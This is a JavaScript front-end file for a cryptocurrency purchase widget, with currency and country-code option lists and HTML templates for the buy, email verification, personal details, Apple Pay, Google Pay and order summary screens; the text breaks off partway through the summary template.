const url =
  "https://crypto-processing-backend-a4cshfazgbbsgze6.eastus-01.azurewebsites.net/api/v1/checkout-merchant/widget";

const baseURL =
  "https://crypto-processing-user-panel-h2czeeg9eeguh7hh.eastus-01.azurewebsites.net";
let verifiedResponse = null;

console.log("called 5555");

const options_Data = {
  inputField1: [
    { name: "USD", value: "USD", icon: `${baseURL}/assets/currency/USD.svg` },
    { name: "EUR", value: "EUR", icon: `${baseURL}/assets/currency/EUR.svg` },
  ],
  inputField2: [
    { name: "BTC", value: "BTC", icon: `${baseURL}/assets/currency/BTC.svg` },
    { name: "ETH", value: "ETH", icon: `${baseURL}/assets/currency/ETH.svg` },

    {
      name: "USDC_ERC20",
      value: "USDC_ERC20",
      icon: `${baseURL}/assets/currency/USDC_ERC20.svg`,
    },

    {
      name: "USDT_ERC20",
      value: "USDT_ERC20",
      icon: `${baseURL}/assets/currency/USDT_ERC20.svg`,
    },

    {
      name: "USDC_BSC",
      value: "USDC_BSC",
      icon: `${baseURL}/assets/currency/USDC_BSC.svg`,
    },

    {
      name: "USDT_BSC",
      value: "USDT_BSC",
      icon: `${baseURL}/assets/currency/USDT_BSC.svg`,
    },

    {
      name: "USDC_POLYGON",
      value: "USDC_POLYGON",
      icon: `${baseURL}/assets/currency/USDC_POLYGON.svg`,
    },

    {
      name: "USDT_POLYGON",
      value: "USDT_POLYGON",
      icon: `${baseURL}/assets/currency/USDT_POLYGON.svg`,
    },

    {
      name: "USDT_TRC20",
      value: "USDT_TRC20",
      icon: `${baseURL}/assets/currency/USDT_TRC20.svg`,
    },

    {
      name: "USDC_TRC20",
      value: "USDC_TRC20",
      icon: `${baseURL}/assets/currency/USDC_TRC20.svg`,
    },
  ],
  countryField: [
    {
      countryCode: 355,
      icon: `${baseURL}/assets/countryCodes/al.svg`,
      name: "Albania",
      subname: "AL",
    },
    {
      countryCode: 376,
      name: "Andorra",
      icon: `${baseURL}/assets/countryCodes/ad.svg`,
      subname: "AD",
    },
    {
      countryCode: 672,
      icon: `${baseURL}/assets/countryCodes/aq.svg`,
      name: "Antarctica",
      subname: "AQ",
    },
    {
      countryCode: 1268,
      icon: `${baseURL}/assets/countryCodes/atg.svg`,
      name: "Antigua and Barbuda",
      subname: "AG",
    },
    {
      countryCode: 54,
      icon: `${baseURL}/assets/countryCodes/ar.svg`,
      name: "Argentina",
      subname: "AR",
    },
    {
      countryCode: 297,
      icon: `${baseURL}/assets/countryCodes/aw.svg`,
      name: "Aruba",
      subname: "AW",
    },
    {
      countryCode: 61,
      icon: `${baseURL}/assets/countryCodes/au.svg`,
      name: "Australia",
      subname: "AU",
    },
    {
      countryCode: 43,
      icon: `${baseURL}/assets/countryCodes/at.svg`,
      name: "Austria",
      subname: "AT",
    },
    {
      countryCode: 32,
      icon: `${baseURL}/assets/countryCodes/be.svg`,
      name: "Belgium",
      subname: "BE",
    },
    {
      countryCode: 1441,
      icon: `${baseURL}/assets/countryCodes/bm.svg`,
      name: "Bermuda",
      subname: "BM",
    },
    {
      countryCode: 975,
      icon: `${baseURL}/assets/countryCodes/bt.svg`,
      name: "Bhutan",
      subname: "BT",
    },
    {
      countryCode: 387,
      icon: `${baseURL}/assets/countryCodes/bosnia_387.svg`,
      name: "Bosnia and Herzegovina",
      subname: "BA",
    },
    {
      countryCode: 55,
      name: "Brazil",
      icon: `${baseURL}/assets/countryCodes/br.svg`,
      subname: "BR",
    },
    {
      countryCode: 673,
      name: "Brunei",
      icon: `${baseURL}/assets/countryCodes/bn.svg`,
      subname: "BN",
    },
    {
      countryCode: 359,
      name: "Bulgaria",
      icon: `${baseURL}/assets/countryCodes/bg.svg`,
      subname: "BG",
    },
    {
      countryCode: 1,
      name: "Canada",
      icon: `${baseURL}/assets/countryCodes/ca.svg`,
      subname: "CA",
    },
    {
      countryCode: 238,
      name: "Cape Verde",
      icon: `${baseURL}/assets/countryCodes/cv.svg`,
      subname: "CV",
    },
    {
      countryCode: 1345,
      name: "Cayman Islands",
      icon: `${baseURL}/assets/countryCodes/ky.svg`,

      subname: "KY",
    },
    {
      countryCode: 56,
      name: "Chile",
      icon: `${baseURL}/assets/countryCodes/cl.svg`,

      subname: "CL",
    },
    {
      countryCode: 506,
      name: "Costa Rica",
      icon: `${baseURL}/assets/countryCodes/cr.svg`,

      subname: "CR",
    },
    {
      countryCode: 385,
      name: "Croatia",
      icon: `${baseURL}/assets/countryCodes/hr.svg`,
      subname: "HR",
    },
    {
      countryCode: 357,
      name: "Cyprus",
      icon: `${baseURL}/assets/countryCodes/cy.svg`,
      subname: "CY",
    },
    {
      countryCode: 420,
      name: "Czech Republic",
      icon: `${baseURL}/assets/countryCodes/czech_420.svg`,
      subname: "CZ",
    },
    {
      countryCode: 45,
      name: "Denmark",
      icon: `${baseURL}/assets/countryCodes/dk.svg`,
      subname: "DK",
    },
    {
      countryCode: 372,
      name: "Estonia",
      icon: `${baseURL}/assets/countryCodes/ee.svg`,
      subname: "EE",
    },
    {
      countryCode: 500,
      name: "Falkland Islands",
      icon: `${baseURL}/assets/countryCodes/fk.svg`,
      subname: "FK",
    },
    {
      countryCode: 298,
      name: "Faroe Islands",
      icon: `${baseURL}/assets/countryCodes/fo.svg`,
      subname: "FO",
    },
    {
      countryCode: 358,
      name: "Finland",
      icon: `${baseURL}/assets/countryCodes/fi.svg`,
      subname: "FI",
    },
    {
      countryCode: 33,
      name: "France",
      icon: `${baseURL}/assets/countryCodes/fr.svg`,
      subname: "FR",
    },
    {
      countryCode: 594,
      name: "French Guiana",
      icon: `${baseURL}/assets/countryCodes/gf.svg`,
      subname: "GF",
    },
    {
      countryCode: 49,
      name: "Germany",
      icon: `${baseURL}/assets/countryCodes/de.svg`,
      subname: "DE",
    },
    {
      countryCode: 350,
      name: "Gibraltar",
      icon: `${baseURL}/assets/countryCodes/gi.svg`,
      subname: "GI",
    },
    {
      countryCode: 30,
      name: "Greece",
      icon: `${baseURL}/assets/countryCodes/gr.svg`,
      subname: "GR",
    },
    {
      countryCode: 299,
      name: "Greenland",
      icon: `${baseURL}/assets/countryCodes/gl.svg`,
      subname: "GL",
    },
    {
      countryCode: 1473,
      name: "Grenada",
      icon: `${baseURL}/assets/countryCodes/gd.svg`,
      subname: "GD",
    },
    {
      countryCode: 590,
      name: "Guadeloupe",
      icon: `${baseURL}/assets/countryCodes/gp.svg`,
      subname: "GP",
    },
    {
      countryCode: 441481,
      name: "Guernsey",
      icon: `${baseURL}/assets/countryCodes/gg.svg`,
      subname: "GG",
    },
    {
      countryCode: 852,
      name: "Hong Kong",
      icon: `${baseURL}/assets/countryCodes/hong_kong_852.svg`,
      subname: "HK",
    },
    {
      countryCode: 36,
      name: "Hungary",
      icon: `${baseURL}/assets/countryCodes/hu.svg`,
      subname: "HU",
    },
    {
      countryCode: 354,
      name: "Iceland",
      icon: `${baseURL}/assets/countryCodes/is.svg`,
      subname: "IS",
    },
    {
      countryCode: 91,
      name: "India",
      icon: `${baseURL}/assets/countryCodes/in.svg`,
      subname: "IN",
    },
    {
      countryCode: 353,
      name: "Ireland",
      icon: `${baseURL}/assets/countryCodes/ie.svg`,
      subname: "IE",
    },
    {
      countryCode: 39,
      name: "Italy",
      icon: `${baseURL}/assets/countryCodes/it.svg`,
      subname: "IT",
    },
    {
      countryCode: 81,
      name: "Japan",
      icon: `${baseURL}/assets/countryCodes/jp.svg`,
      subname: "JP",
    },
    {
      countryCode: 441534,
      name: "Jersey",
      icon: `${baseURL}/assets/countryCodes/je.svg`,
      subname: "JE",
    },
    {
      countryCode: 962,
      name: "Jordan",
      icon: `${baseURL}/assets/countryCodes/jo.svg`,
      subname: "JO",
    },
    {
      countryCode: 254,
      name: "Kenya",
      icon: `${baseURL}/assets/countryCodes/ke.svg`,
      subname: "KE",
    },
    {
      countryCode: 383,
      name: "Kosovo",
      icon: `${baseURL}/assets/countryCodes/xk.svg`,
      subname: "XK",
    },
    {
      countryCode: 371,
      name: "Latvia",
      icon: `${baseURL}/assets/countryCodes/lv.svg`,
      subname: "LV",
    },
    {
      countryCode: 423,
      name: "Liechtenstein",
      icon: `${baseURL}/assets/countryCodes/li.svg`,
      subname: "LI",
    },
    {
      countryCode: 370,
      name: "Lithuania",
      icon: `${baseURL}/assets/countryCodes/lt.svg`,
      subname: "LT",
    },
    {
      countryCode: 352,
      name: "Luxembourg",
      icon: `${baseURL}/assets/countryCodes/lu.svg`,
      subname: "LU",
    },
    {
      countryCode: 261,
      name: "Madagascar",
      icon: `${baseURL}/assets/countryCodes/mg.svg`,
      subname: "MG",
    },
    {
      countryCode: 356,
      name: "Malta",
      icon: `${baseURL}/assets/countryCodes/mt.svg`,
      subname: "MT",
    },
    {
      countryCode: 441624,
      name: "Montserrat",
      icon: `${baseURL}/assets/countryCodes/ms.svg`,
      subname: "MS",
    },
    {
      countryCode: 596,
      name: "Martinique",
      icon: `${baseURL}/assets/countryCodes/mq.svg`,
      subname: "MQ",
    },
    {
      countryCode: 262,
      name: "Mayotte",
      icon: `${baseURL}/assets/countryCodes/yt.svg`,
      subname: "YT",
    },
    {
      countryCode: 373,
      name: "Moldova",
      icon: `${baseURL}/assets/countryCodes/md.svg`,
      subname: "MD",
    },
    {
      countryCode: 382,
      name: "Montenegro",
      icon: `${baseURL}/assets/countryCodes/me.svg`,
      subname: "ME",
    },
    {
      countryCode: 1664,
      name: "Montserrat",
      icon: `${baseURL}/assets/countryCodes/ms.svg`,
      subname: "MS",
    },
    {
      countryCode: 212,
      name: "Morocco",
      icon: `${baseURL}/assets/countryCodes/ma.svg`,
      subname: "MA",
    },
    {
      countryCode: 258,
      name: "Mozambique",
      icon: `${baseURL}/assets/countryCodes/mz.svg`,
      subname: "MZ",
    },
    {
      countryCode: 264,
      name: "Namibia",
      icon: `${baseURL}/assets/countryCodes/na.svg`,
      subname: "NA",
    },
    {
      countryCode: 31,
      name: "Netherlands",
      icon: `${baseURL}/assets/countryCodes/nl.svg`,
      subname: "NL",
    },
    {
      countryCode: 64,
      name: "New Zealand",
      icon: `${baseURL}/assets/countryCodes/nz.svg`,
      subname: "NZ",
    },
    {
      countryCode: 389,
      name: "North Macedonia",
      icon: `${baseURL}/assets/countryCodes/mk.svg`,
      subname: "MK",
    },
    {
      countryCode: 47,
      name: "Norway",
      icon: `${baseURL}/assets/countryCodes/no.svg`,
      subname: "NO",
    },
    {
      countryCode: 968,
      name: "Oman",
      icon: `${baseURL}/assets/countryCodes/om.svg`,
      subname: "OM",
    },
    {
      countryCode: 63,
      name: "Philippines",
      icon: `${baseURL}/assets/countryCodes/ph.svg`,
      subname: "PH",
    },
    {
      countryCode: 870,
      name: "Pitcairn Islands",
      icon: `${baseURL}/assets/countryCodes/Pitcairn_870.svg`,
      subname: "PN",
    },
    {
      countryCode: 48,
      name: "Poland",
      icon: `${baseURL}/assets/countryCodes/pl.svg`,
      subname: "PL",
    },
    {
      countryCode: 351,
      name: "Portugal",
      icon: `${baseURL}/assets/countryCodes/pt.svg`,
      subname: "PT",
    },
    {
      countryCode: 1787,
      name: "Puerto Rico",
      icon: `${baseURL}/assets/countryCodes/pr.svg`,
      subname: "PR",
    },
    {
      countryCode: 974,
      name: "Qatar",
      icon: `${baseURL}/assets/countryCodes/qa.svg`,
      subname: "QA",
    },
    {
      countryCode: 262,
      name: "Réunion",
      icon: `${baseURL}/assets/countryCodes/Reunion_262.svg`,
      subname: "RE",
    },
    {
      countryCode: 40,
      name: "Romania",
      icon: `${baseURL}/assets/countryCodes/ro.svg`,
      subname: "RO",
    },
    {
      countryCode: 290,
      name: "Saint Helena",
      icon: `${baseURL}/assets/countryCodes/saint_helena_290.svg`,
      subname: "SH",
    },
    {
      countryCode: 1758,
      name: "Saint Lucia",
      icon: `${baseURL}/assets/countryCodes/Saint_Lucia_1758.svg`,
      subname: "LC",
    },
    {
      countryCode: 1784,
      name: "Saint Vincent and the Grenadines",
      icon: `${baseURL}/assets/countryCodes/Saint_Vincent_1784.svg`,
      subname: "VC",
    },
    {
      countryCode: 378,
      name: "San Marino",
      icon: `${baseURL}/assets/countryCodes/sm.svg`,
      subname: "SM",
    },
    {
      countryCode: 239,
      name: "São Tomé and Príncipe",
      icon: `${baseURL}/assets/countryCodes/sao_tome_239.svg`,
      subname: "ST",
    },
    {
      countryCode: 221,
      name: "Senegal",
      icon: `${baseURL}/assets/countryCodes/sn.svg`,
      subname: "SN",
    },
    {
      countryCode: 381,
      name: "Serbia",
      icon: `${baseURL}/assets/countryCodes/rs.svg`,
      subname: "RS",
    },
    {
      countryCode: 65,
      name: "Singapore",
      icon: `${baseURL}/assets/countryCodes/sg.svg`,
      subname: "SG",
    },
    {
      countryCode: 421,
      name: "Slovakia",
      icon: `${baseURL}/assets/countryCodes/sk.svg`,
      subname: "SK",
    },
    {
      countryCode: 386,
      name: "Slovenia",
      icon: `${baseURL}/assets/countryCodes/si.svg`,
      subname: "SI",
    },
    {
      countryCode: 27,
      name: "South Africa",
      icon: `${baseURL}/assets/countryCodes/za.svg`,
      subname: "ZA",
    },
    {
      countryCode: 82,
      name: "South Korea",
      icon: `${baseURL}/assets/countryCodes/kr.svg`,
      subname: "KR",
    },
    {
      countryCode: 34,
      name: "Spain",
      icon: `${baseURL}/assets/countryCodes/es.svg`,
      subname: "ES",
    },
    {
      countryCode: 94,
      name: "Sri Lanka",
      icon: `${baseURL}/assets/countryCodes/lk.svg`,
      subname: "LK",
    },
    {
      countryCode: 47,
      name: "Svalbard and Jan Mayen",
      icon: `${baseURL}/assets/countryCodes/svalbard_47.svg`,
      subname: "SJ",
    },
    {
      countryCode: 46,
      name: "Sweden",
      icon: `${baseURL}/assets/countryCodes/se.svg`,
      subname: "SE",
    },
    {
      countryCode: 41,
      name: "Switzerland",
      icon: `${baseURL}/assets/countryCodes/ch.svg`,
      subname: "CH",
    },
    {
      countryCode: 886,
      name: "Taiwan",
      icon: `${baseURL}/assets/countryCodes/tw.svg`,
      subname: "TW",
    },
    {
      countryCode: 255,
      name: "Tanzania",
      icon: `${baseURL}/assets/countryCodes/tz.svg`,
      subname: "TZ",
    },
    {
      countryCode: 216,
      name: "Tunisia",
      icon: `${baseURL}/assets/countryCodes/tn.svg`,
      subname: "TN",
    },
    {
      countryCode: 90,
      name: "Turkey",
      icon: `${baseURL}/assets/countryCodes/tr.svg`,
      subname: "TR",
    },
    {
      countryCode: 971,
      name: "United Arab Emirates",
      icon: `${baseURL}/assets/countryCodes/ae.svg`,
      subname: "AE",
    },
    {
      countryCode: 44,
      name: "United Kingdom",
      icon: `${baseURL}/assets/countryCodes/gb.svg`,
      subname: "GB",
    },
    {
      countryCode: 598,
      name: "Uruguay",
      icon: `${baseURL}/assets/countryCodes/uy.svg`,
      subname: "UY",
    },
    {
      countryCode: 84,
      name: "Vietnam",
      icon: `${baseURL}/assets/countryCodes/vn.svg`,
      subname: "VN",
    },
    {
      countryCode: 380,
      name: "Ukraine",
      icon: `${baseURL}/assets/countryCodes/ua.svg`,
      subname: "UA",
    },
    {
      countryCode: 7,
      name: "Russian Federation",
      icon: `${baseURL}/assets/countryCodes/ru.svg`,
      subname: "RU",
    },
    {
      countryCode: 995,
      name: "Georgia",
      icon: `${baseURL}/assets/countryCodes/ge.svg`,
      subname: "GE",
    },
  ],
};

const visa_icon = `${baseURL}/assets/paymenticons/visa.svg`;
const gpay_icon = `${baseURL}/assets/paymenticons/google.svg`;
const BTC = `${baseURL}/assets/currency/BTC.svg`;
const EUR = `${baseURL}/assets/currency/EUR.svg`;
const India = `${baseURL}/assets/countryCodes/in.svg`;
const apple_icon = `${baseURL}/assets/paymenticons/apple.svg`; // Adjust path
const apple_white = `${baseURL}/assets/paymenticons/apple_white.svg`; // Adjust path
const email_icon = `${baseURL}/assets/general/email.svg`;
const google_icon = `${baseURL}/assets/paymenticons/google.svg`; // Adjust path
const orderImage = `${baseURL}/assets/general/order.svg`;
const google = `${baseURL}/assets/paymenticons/google.svg`; // Adjust path
const gpay_white = `${baseURL}/assets/paymenticons/gpay_white.svg`; // Adjust path
const success_icon = `${baseURL}/assets/general/success.png`; // Adjust path
const back_icon = `${baseURL}/assets/general/back.svg`;
const warning_icon = `${baseURL}/assets/general/warning.svg`;
// apple
const applePayForm = `
  <form class="cw_form" style="text-align: center;" id="cw-apple-pay-form">
     <img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />
    <div style="margin-bottom: 16px;">
      <img src="${apple_icon}" alt="Apple" style="width: 120px;" />
    </div>

    <h2 style="margin-bottom: 10px;"></h2>

    <p style="font-size: 14px; color: #555; margin-bottom: 20px;">
      Click on the Apple Pay button below to complete your payment.
    </p>

    <p style="font-size: 13px; color: #666; margin-bottom: 20px;">
      <strong>Order ID:</strong><br />
      <span id="order_id" style="font-size: 13px;"></span>
    </p>

    <div class="cw_actions" style="margin-top: 24px;">
      <button type="submit" id="cw-apple-pay-btn" style="display: flex; align-items: center; justify-content: center; gap: 10px; background-color: #000000;">
        <img src="${apple_white}" alt="Apple Icon" style="width: 45px;" />
      </button>
    </div>

    <p style="font-size: 13px; color: #888; margin-top: 20px;">
      This window will automatically close after successful payment.
    </p>
  </form>
`;

const appleScannerForm = `
  <div class="cw_form" style="text-align: center;" id="cw-apple-scanner-form">
      <img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />
    <div style="margin-bottom: 16px;">
      <img src="${apple_icon}" alt="Apple Pay" style="width: 120px;" />
    </div>

    <h2 style="margin-bottom: 8px;">Pay with Apple Pay</h2>
    <p style="font-size: 14px; color: #555; margin-bottom: 20px;">
      Your browser or device doesn't support Apple Pay.<br />
      Scan the QR code below on your iOS device.
    </p>

    <div style="margin-bottom: 20px;">
      <img src="" id="apple_qr" alt="Scan QR Code" style="width: 180px; border-radius: 8px;" />
    </div>

    <p style="font-size: 14px; color: #666;">
      <strong>Order ID:</strong><br />
       <span id="order_id" style="font-size: 13px;"></span>
    </p>

  </div>
`;

const convert_form = `
  <form  class="cw_form"  id="cw-convert-form">

    <div class="title-country">
      <h2 style="margin: 0 0 1rem;">Buy</h2>
      <div id="countryField" class="country-dropdown">
        <img src=${India} alt="" class="input-icon"  />
        <span id="country" class="country_name">India</span>
         <svg
          class="dropdown-icon"
          xmlns="http://www.w3.org/2000/svg"
          width="16"
          height="16"
          fill="currentColor"
          viewBox="0 0 16 16"
        >
          <path d="M1.5 5.5l6 6 6-6" stroke="currentColor" stroke-width="2" fill="none" />
        </svg>

      </div>
    </div>

    <!-- From Currency -->
    <div class="cw_form-group">
  <label for="cw-from-amount" class="cw_input-label">Pay</label>
  
  <div class="currency_box">
    <input type="number" id="cw-from-amount" class="" required placeholder="Enter amount" />

    <div class="select-dropdown" id="inputField1" tabindex="0">
      <span id="from-currency" class="currency_name">EUR</span>
      <img src=${EUR} alt="" class="input-icon" />
      <svg
        class="dropdown-icon"
        xmlns="http://www.w3.org/2000/svg"
        width="16"
        height="16"
        fill="currentColor"
        viewBox="0 0 16 16"
      >
        <path d="M1.5 5.5l6 6 6-6" stroke="currentColor" stroke-width="2" fill="none" />
      </svg>
    </div>
  </div>
</div>


    <!-- To Currency -->
<div class="cw_form-group">
    <label for="cw-from-amount" class="cw_input-label">Receive</label>
    <div class="currency_box">
      <input type="number" class="" id="cw-to-amount" disabled placeholder="You get" />
      <div class="select-dropdown" id="inputField2" tabindex="0">
        <span id="to-currency" class="currency_name">BTC</span>
        <img src=${BTC} alt="" class="input-icon"  />
        <svg
          class="dropdown-icon"
          xmlns="http://www.w3.org/2000/svg"
          width="16"
          height="16"
          fill="currentColor"
          viewBox="0 0 16 16"
        >
          <path d="M1.5 5.5l6 6 6-6" stroke="currentColor" stroke-width="2" fill="none" />
        </svg>
      </div>
    </div>
     </div>

    <h3>Choose payment method</h3>

    <!-- Payment Cards -->
    <div class="payment-cards" style="display: flex; gap: 1rem; margin: 1rem 0;">
  <div class="payment-card" data-method="Card" style="flex: 1; ...">
    <img src="${visa_icon}" alt="Visa" style="height: 20px;" />
    <p style="margin-top: 0.5rem;">1.75%</p>
  </div>
  <div class="payment-card" data-method="Apple Pay" style="flex: 1; ...">
    <img src="${apple_icon}" alt="Apple Pay" style="height: 20px;" />
    <p style="margin-top: 0.5rem;">1.75%</p>
  </div>
  <div class="payment-card" data-method="Google Pay" style="flex: 1; ...">
    <img src="${gpay_icon}" alt="Google Pay" style="height: 20px;" />
    <p style="margin-top: 0.5rem;">1.75%</p>
  </div>
</div>


    <div class="cw_actions">
      <button type="submit" class="submit_button" id="cw-convert-btn" style="width: 100%;">
        Continue <span style="margin-left: 6px;">&#8594;</span>
      </button>
    </div>

    <!-- Bottom Popup -->
    <div class="bottom-popup" id="bottomPopup" aria-hidden="true">
      <div class="bottom-popup-header">
        <span id="popupTitle">Select Currency</span>
        <span id="closePopupBtn" >&times;</span>
      </div>
      <span style="color :grey;">Available via selected method</span>
      <input type="text" id="popupSearch" placeholder="Search..." autocomplete="off" />
      <ul class="popup-list" id="popupList"></ul>
    </div>
  </form>
`;

const emailOTPPage = `
  <form style="text-align: center;" class="cw_form" id="cw-email-otp-form">
  <img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />

   <div style="display: flex;
    flex-direction: column;
    gap: 20px;
    margin: auto;">
  <img class="email_icon" src=${email_icon} alt="email"></img>

 


    <h2 style="">Confirm your email</h2>
    <p style="">
      Please enter the 6-digit verification code sent to <strong id="selected_email"></strong>.
    </p>

    <div class="otp_group">
      <input type="text" maxlength="1" class="otp_input" />
      <input type="text" maxlength="1" class="otp_input" />
      <input type="text" maxlength="1" class="otp_input" />
      <input type="text" maxlength="1" class="otp_input" />
      <input type="text" maxlength="1" class="otp_input" />
      <input type="text" maxlength="1" class="otp_input" />
    </div>

    <p class="resend_text">Resend code in <span id="resend-timer">0:30</span></p>
 </div>
    <div class="cw_actions">
      <button type="submit" class="submit_button" id="cw-otp-btn">
        Continue <span style="margin-left: 6px;">&#8594;</span>
      </button>
    </div>
  </form>
`;

const emailVerification = `
<form class="cw_form" style="text-align: center; " id="cw-email-form">
<img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />

<div style="display: flex;
    flex-direction: column;
    gap: 20px;
    margin: auto;">
   <img class="email_icon" src=${email_icon} alt="email"></img>
   <h2 style="">Enter email</h2>
   <p style="">
      We'll send you a verification code that you'll need to enter on the next step.
   </p>
   <div class="cw_form-group">
      <label class="cw_input-label" for="cw-email">Enter email</label>
      <input
         type="email"
         id="cw-email"
         name="email"
         class="cw_input"
         placeholder="you@example.com"
         required
         />
   </div>

   </div>
   <div class="cw_actions">
      <button type="submit" class="submit_button" id="cw-email-btn">
      Continue <span style="margin-left: 6px;">&#8594;</span>
      </button>
   </div>
</form>
`;

const googlePayForm = `
  <form class="cw_form" style="text-align: center;" id="cw-google-form">
     <img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />
    <div style="margin-bottom: 16px;">
      <img src="${google_icon}" alt="Apple" style="width: 120px;" />
    </div>

    <h2 style="margin-bottom: 8px;">Pay with Google Pay</h2>
    <p style="font-size: 14px; color: #555; margin-bottom: 20px;">
      You'll be redirected to the payment window by clicking “Continue to payment”.
    </p>

   
    <p style="font-size: 13px; color: #666; margin-top: 12px;">
      By paying, you accept example.com
      <a href="https://example.com/terms" target="_blank" style="color: #007bff; text-decoration: underline;">
         Terms of Use
      </a>
    </p>

    <div class="cw_actions" style="margin-top: 24px;">
      <button type="submit" class="submit_button" id="cw-google-pay-btn">
        Continue <span style="margin-left: 6px;">&#8594;</span>
      </button>
    </div>
  </form>
`;

const infoForm = `
<form class="cw_form" style="width: 100%;" id="cw-info-form">
<img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />
   <h2 style="text-align: center;">Your Information</h2>
   <div style="display: flex; gap: 10px; width: 100%;">
      <div class="cw_form-group" style="flex: 1;">
         <label for="first-name" class="cw_input-label">First Name</label>
         <input type="text" id="first-name" class="cw_input" placeholder="John" required />
      </div>
      <div class="cw_form-group" style="flex: 1;">
         <label for="last-name" class="cw_input-label">Last Name</label>
         <input type="text" id="last-name" class="cw_input" placeholder="Doe" required />
      </div>
   </div>
   <div style="width: 100%;">
      <label style="text-align: left;">Date of Birth</label>
      <div style="display: flex; gap: 10px; width: 100%; margin-top: 5px;">
         <input type="text" class="cw_input" style="flex: 1; width: 60px;" placeholder="DD" maxlength="2" required />
         <input type="text" class="cw_input" style="flex: 1; width: 60px;" placeholder="MM" maxlength="2" required />
         <input type="text" class="cw_input" style="flex: 2; width: 80px;" placeholder="YYYY" maxlength="4" required />
      </div>
   </div>
   <div class="cw_form-group" style="flex: 1;">
      <label for="customerCountry" class="cw_input-label">Country</label>
      <input type="text" id="customerCountry" class="cw_input" placeholder="India" required />
   </div>
   <div class="cw_form-group" style="flex: 1;">
      <label for="address" class="cw_input-label">Address</label>
      <input type="text" id="address" class="cw_input" placeholder="123 Main Street, Apt 4B" required />
   </div>
   <div style="display: flex; gap: 10px;">
      <div class="cw_form-group" style="flex: 1;">
         <label for="city" class="cw_input-label">City</label>
         <input type="text" id="city" class="cw_input" placeholder="Mumbai" required />
      </div>
      <div class="cw_form-group" style="flex: 1;">
         <label for="zip" class="cw_input-label">ZIP</label>
         <input type="text" id="zip" class="cw_input" placeholder="400001" required />
      </div>
   </div>
   <div class="cw_actions" >
      <button type="submit" class="submit_button" id="cw-info-btn">
      Continue <span style="margin-left: 6px;">&#8594;</span>
      </button>
   </div>
</form>
`;

const OrderForm = `
<div class="cw_form" style="text-align: center;" id="cw-order-form">
  
   <div >
      <img src="${orderImage}" alt="Visa" style="width: 90px;" />
   </div>
   <h2 >Order in Review</h2>
   <p style="font-size: 14px; color: grey;">
      This process may take up to 30 minutes.<br />
      You will receive the crypto once it's approved.
   </p>
   <div class="order_summary" style="margin-inline: 30px;">
      <h3 style="text-align: left; ">Your Order</h3>
      <div class="summary_row">
         <span style="font-size: 12px;">Pay</span>
         <span >
         <img id="fiat_icon" src="" alt="" style="width: 16px; vertical-align: middle; margin-right: 6px;" />
         <span  style="font-size: 12px;" id="fiat_amount"></span>
         </span>
      </div>
      <div class="summary_row">
         <span style="font-size: 12px;">Receive</span>
         <span >
         <img id="receiver_icon" src="" alt="" style="width: 16px; vertical-align: middle; margin-right: 6px;" />
         <span style="font-size: 12px;" id="receiver_amount"></span>
         </span>
      </div>
      <div class="summary_row">
         <span style="font-size: 12px;">Unit Price</span>
         <span style="font-size: 12px;" id="unitFee"></span>
      </div>
      <div class="summary_row">
         <span style="font-size: 12px;">Processing Fee</span>
         <span style="font-size: 12px;" id="processingFee"></span>
      </div>
      <div class="summary_row">
         <span style="font-size: 12px;">Network Fee</span>
         <span style="font-size: 12px;" id="networkFee"></span>
      </div>
      <div class="summary_row">
         <span style="font-size: 12px;">Recipient Address</span>
         <span style="font-size: 12px;" id="receiver-address-order" style="font-size: 13px;"></span>
      </div>
   </div>
   <div class="" style="border-bottom: none; text-align: center; color: grey;">
      <span>Order ID</span>
      <span id="order_id" style="font-size: 13px;"></span>
   </div>
</div>
`;

const payWithGpayForm = `
<form class="cw_form" style="text-align: center;" id="cw-gPay-form">
  <img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />
   <div style="margin-bottom: 16px;">
      <img src="${google}" alt="gpay" style="width: 120px;" />
   </div>
   <h2 id="fiat_amount"></h2>
   <p style="font-size: 14px; color: #555; margin-bottom: 20px;">
      Click on Google pay button below to complete your payment.
   </p>
   <p style="font-size: 13px; color: #666; margin-bottom: 20px;">
      <strong>Order ID:</strong><br />
      <span id="order_id" style="font-size: 13px;"></span>
   </p>
   <div class="cw_actions" style="margin-top: 24px;">
      <button type="submit" id="cw-convert-btn" style="display: flex; align-items: center; justify-content: center; gap: 10px; background-color: #000000;">
      <img src="${gpay_white}" alt="Gpay Icon" style="width: 45px;" />
      </button>
   </div>
   <p style="font-size: 13px; color: #888; margin-top: 20px;">
      This window will automatically close after successful payment.
   </p>
</form>
`;

const successPage = `
<form class="cw_form" style="text-align: center;" id="success-form">
<div style="margin: auto;">
   <div style="margin-bottom: 16px;">
      <img src="${success_icon}" alt="Success" style="width: 56px;" />
   </div>
   <h2 >Payment Successful</h2>
   <p style="font-size: 14px; color: #555; margin-top: 20px;">
      Your payment has been received. Thank you!
   </p>
   
   </div>
   <div class="cw_actions" style="margin-top: 24px;">
      <button type="submit" class="submit_button" id="cw-convert-btn">
      Done 
      </button>
   </div>
</form>
`;

const summaryForm = `
<form class="cw_form" style="text-align: center;" id="cw-summary-form">
<img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />
   <h2 >Summary</h2>
  

    <div class="cw_form-group" >
         <label for="receiver-address-summary" class="cw_input-label">Address</label>
         <input
         type="text"
         id="receiver-address-summary"
         class="cw_input"
         placeholder=""
         disabled
         />
      </div>
      <div class="order_summary" >

      <h3>Your Order</h3>
      <div class="summary_row" >
         <span style="font-size: 12px;">Pay</span>
         <div>
         <img id="fiat_icon" src="" alt="" style="width: 16px; vertical-align: middle; margin-right: 6px;" ></img>
         <span style="font-size: 12px;" id="fiat_amount"></span>
         </div>
      </div>
      <div class="summary_row">
         <span style="font-size: 12px;">Receive</span>
         <div>
         <img id="receiver_icon" src="" alt="" style="width: 16px; vertical-align: middle; margin-right: 6px;" />
          <span style="font-size: 12px;" id="receiver_amount"></span>
         </div>
      </div>
      <div class="summary_row">
         <span style="font-size: 12px;">Unit Price</span>
         <span style="font-size: 12px;" id="unitFee"></span>
      </div>
      <div class="summary_row">
         <span style="font-size: 12px;">Processing Fee</span>
         <span style="font-size: 12px;" id="processingFee"></span>
      </div>
      <div class="summary_row">
